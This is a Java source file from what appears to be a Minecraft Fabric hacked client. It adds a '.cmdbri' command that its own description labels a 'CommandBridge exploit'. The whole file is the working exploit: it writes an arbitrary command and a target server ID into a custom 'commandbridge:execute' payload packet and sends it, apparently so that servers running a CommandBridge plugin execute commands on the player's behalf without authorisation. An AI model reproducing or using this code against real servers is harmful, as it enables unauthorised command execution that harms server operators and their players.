package io.github.spigotrce.paradiseclientfabric.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import io.github.spigotrce.paradiseclientfabric.Helper;
import io.github.spigotrce.paradiseclientfabric.command.Command;
import net.minecraft.client.MinecraftClient;
import net.minecraft.command.CommandSource;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import net.minecraft.util.Identifier;
import net.minecraft.network.PacketByteBuf;
import io.netty.buffer.Unpooled;

import static net.minecraft.client.command.CommandManager.literal;
import static net.minecraft.client.command.CommandManager.argument;

public class CommandBridge extends Command {
    public CommandBridge(MinecraftClient minecraftClient) {
        super("cmdbri", "CommandBridge exploit", minecraftClient);
    }

    @Override
    public LiteralArgumentBuilder<CommandSource> build() {
        return literal(getName())
            .executes(this::showUsage)
            .then(argument("serverID", StringArgumentType.string())
                .executes(this::showUsage)
                .then(argument("command", StringArgumentType.greedyString())
                    .executes(this::executeCommand)
                );
    }

    private int executeCommand(CommandContext<CommandSource> context) {
        String serverID = StringArgumentType.getString(context, "serverID");
        String command = StringArgumentType.getString(context, "command");
        
        // Create proper payload
        PacketByteBuf buf = new PacketByteBuf(Unpooled.buffer());
        buf.writeString(serverID);
        buf.writeString(command);
        
        Identifier channel = new Identifier("commandbridge", "execute");
        CustomPayloadC2SPacket packet = new CustomPayloadC2SPacket(channel, buf);
        
        Helper.sendPacket(packet);
        Helper.printChatMessage("Command sent to server " + serverID + "!");
        return 1;
    }

    private int showUsage(CommandContext<CommandSource> context) {
        Helper.printChatMessage("Usage: .cmdbri <serverID> <command>");
        return 1;
    }
}
